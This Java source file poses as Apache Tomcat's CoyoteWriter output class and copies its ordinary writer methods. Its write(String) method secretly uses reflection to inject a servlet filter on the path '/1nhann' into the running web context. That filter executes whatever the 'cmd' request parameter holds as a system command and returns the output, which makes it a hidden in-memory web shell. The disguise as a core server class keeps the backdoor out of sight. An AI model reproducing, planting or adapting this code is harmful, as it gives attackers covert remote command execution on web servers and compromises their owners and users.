package org.apache.catalina.connector;

import org.apache.catalina.Context;
import org.apache.catalina.connector.OutputBuffer;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;

public class CoyoteWriter extends PrintWriter implements Filter {
    private static final char[] LINE_SEP = System.lineSeparator().toCharArray();
    protected OutputBuffer ob;
    protected boolean error = false;

    public CoyoteWriter(OutputBuffer ob) {
        super(ob);
        this.ob = ob;
    }

    protected Object clone() throws CloneNotSupportedException {
        throw new CloneNotSupportedException();
    }

    void clear() {
        this.ob = null;
    }

    void recycle() {
        this.error = false;
    }

    public void flush() {
        if (!this.error) {
            try {
                this.ob.flush();
            } catch (IOException var2) {
                this.error = true;
            }

        }
    }

    public void close() {
        try {
            this.ob.close();
        } catch (IOException var2) {
        }

        this.error = false;
    }

    public boolean checkError() {
        this.flush();
        return this.error;
    }

    public void write(int c) {
        if (!this.error) {
            try {
                this.ob.write(c);
            } catch (IOException var3) {
                this.error = true;
            }

        }
    }

    public void write(char[] buf, int off, int len) {
        if (!this.error) {
            try {
                this.ob.write(buf, off, len);
            } catch (IOException var5) {
                this.error = true;
            }

        }
    }

    public void write(char[] buf) {
        this.write((char[])buf, 0, buf.length);
    }

    public void write(String s, int off, int len) {
        if (!this.error) {
            try {
                this.ob.write(s, off, len);
            } catch (IOException var5) {
                this.error = true;
            }

        }
    }
    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }


    public void write(String s) {
        try {
            StandardContext context = (StandardContext) ((WebappClassLoaderBase) Thread.currentThread().getContextClassLoader()).getResources().getContext();
            OutputBuffer o = new OutputBuffer(0);
            Filter filter = new CoyoteWriter(o);

            String name = "1nhann";

            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName(name);
            filterDef.setFilter(filter);

            Constructor applicationFilterConfig = ApplicationFilterConfig.class.getDeclaredConstructor(new Class[]{Context.class,FilterDef.class});
            applicationFilterConfig.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) applicationFilterConfig.newInstance(new Object[]{context,filterDef});


            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName(name);
            filterMap.addURLPattern("/1nhann");

            Map<String, ApplicationFilterConfig> filterConfigs = (Map<String, ApplicationFilterConfig>)getFieldValue(context,"filterConfigs");

            if (filterConfigs.get(name) == null){
                filterConfigs.put(name,filterConfig);
            }else {
                filterConfigs.remove(name);
                filterConfigs.put(name,filterConfig);
            }
            if (context.findFilterDef(name) == null){
                context.addFilterDef(filterDef);
                context.addFilterMapBefore(filterMap);
            }else {
                context.removeFilterDef(filterDef);
                context.addFilterDef(filterDef);
                context.addFilterMapBefore(filterMap);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        this.write((String)s, 0, s.length());
    }

    public void print(boolean b) {
        if (b) {
            this.write("true");
        } else {
            this.write("false");
        }

    }

    public void print(char c) {
        this.write(c);
    }

    public void print(int i) {
        this.write(String.valueOf(i));
    }

    public void print(long l) {
        this.write(String.valueOf(l));
    }

    public void print(float f) {
        this.write(String.valueOf(f));
    }

    public void print(double d) {
        this.write(String.valueOf(d));
    }

    public void print(char[] s) {
        this.write(s);
    }

    public void print(String s) {
        if (s == null) {
            s = "null";
        }

        this.write(s);
    }

    public void print(Object obj) {
        this.write(String.valueOf(obj));
    }

    public void println() {
        this.write(LINE_SEP);
    }

    public void println(boolean b) {
        this.print(b);
        this.println();
    }

    public void println(char c) {
        this.print(c);
        this.println();
    }

    public void println(int i) {
        this.print(i);
        this.println();
    }

    public void println(long l) {
        this.print(l);
        this.println();
    }

    public void println(float f) {
        this.print(f);
        this.println();
    }

    public void println(double d) {
        this.print(d);
        this.println();
    }

    public void println(char[] c) {
        this.print(c);
        this.println();
    }

    public void println(String s) {
        this.print(s);
        this.println();
    }

    public void println(Object o) {
        this.print(o);
        this.println();
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        HttpServletRequest request = (HttpServletRequest) servletRequest;

        Runtime rt = Runtime.getRuntime();
        String cmd = request.getParameter("cmd");
        Process process = rt.exec(cmd);
        java.io.InputStream in = process.getInputStream();
        PrintWriter writer = response.getWriter();
        java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
        java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
        String s = null;
        while ((s = stdInput.readLine()) != null) {
            writer.println(s);
        }
        writer.flush();
        writer.close();
    }
}
